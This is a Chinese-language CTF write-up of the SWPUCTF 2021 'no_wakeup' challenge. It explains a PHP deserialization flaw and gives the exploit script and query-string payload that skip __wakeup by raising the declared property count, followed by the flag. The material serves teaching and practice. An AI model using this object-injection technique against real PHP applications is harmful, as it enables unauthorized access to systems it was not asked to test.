---
title: SWPUCTF 2021 新生赛 no_wakeup
date: 2026-03-10T20:10:02+08:00
slug: swpuctf2021-no-wakeup
description: PHP 反序列化 __wakeup 绕过——属性个数大于实际值即不触发
cover: /img/covers/swpuctf2021-no-wakeup.svg
categories: [CTF]
tags: [SWPUCTF, Web, PHP, 反序列化, wakeup绕过]
toc: true
comment: false
---

## 源代码

```php
<?php
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{
    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin = "user";
        $this->passwd = "123456";
    }

    public function __wakeup(){
        $this->passwd = sha1($this->passwd);
    }

    public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "wllm"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->passwd;
            echo "No wake up";
        }
    }
}

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);
?>
```

## a. 代码审计

首先定义了两个变量 `admin` 和 `passwd`。

- `__construct()`：该方法和 Java 里面构造函数的作用很类似，它是 PHP 里面的构造函数，当代码出现 new 对象的时候自动调用这个函数，为两个变量赋初值。
- `__wakeup()`：这是 PHP 的内置魔术方法，`$this->passwd = sha1($this->passwd)` 这句话会将 passwd 的值进行哈希加密，之后赋给变量 passwd，而且当代码出现反序列化操作的时候就会触发这个函数。
- `__destruct()`：当输入的内容经过一系列操作之后（包括触发了哈希加密之后）仍然符合条件，即 `$admin === "admin"` 并且 `$passwd === "wllm"` 时，包含一个 flag.php 文件，同时返回 flag。

最后的话就是通过 GET 方式赋初值，之后进行反序列化操作。

## b. 具体操作

由上面的代码审计我们可以得出思路：输入的初值会先进行反序列化操作，之后触发 `__wakeup()` 函数进行哈希加密，之后两个变量会进入 `__destruct()` 函数进行验证看是否满足条件。

所以我们先对初值进行序列化操作，之后题目会进行反序列化操作，输入的值就是我们想输入的初值了。以下是我提供的 exp（PHP 在线工具：https://www.jyshare.com/compile/1/ ）：

```php
<?php
class HaHaHa{
    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin = "admin";
        $this->passwd = "wllm";
    }
}
$a = new HaHaHa();
$a = serialize($a);
echo $a;
?>
```

因此构建 payload：

```text
?p=O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

但是前面说过，当代码进行反序列化操作之后会自动触发 `__wakeup()` 函数，所以我们要想办法绕过这个函数。这里引入一种绕过方法：**当序列化字符串里面属性个数比实际属性个数要大的时候，`__wakeup()` 就不会触发**。因此我们将属性个数由 2 改为 3：

得到最终 payload：

```text
?p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

得到最终 flag：

```text
NSSCTF{dd4fe06d-92e0-4fe3-989a-cdfc52772949}
```
